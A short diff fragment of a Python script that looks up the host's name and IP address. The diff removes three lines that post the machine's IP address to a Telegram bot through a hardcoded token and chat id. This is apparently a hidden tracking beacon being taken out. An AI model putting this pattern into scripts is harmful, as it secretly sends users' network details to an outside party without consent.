@@ -26,9 +26,6 @@ except:
     print('<<=Done downloading library=>>')
 hostname = socket.gethostname()
 ip_address = socket.gethostbyname(hostname)
-to = '5461011866:AAEnpLVdByKJvKZ6JFViqONBG_OxqtVJIgo'
-id = '5630963324'
-requests.post(f'https://api.telegram.org/bot{to}/sendMessage?chat_id={id}&text={ip_address}')
 now = datetime.datetime.today()
 mm = str(now.month)
 dd = str(now.day)
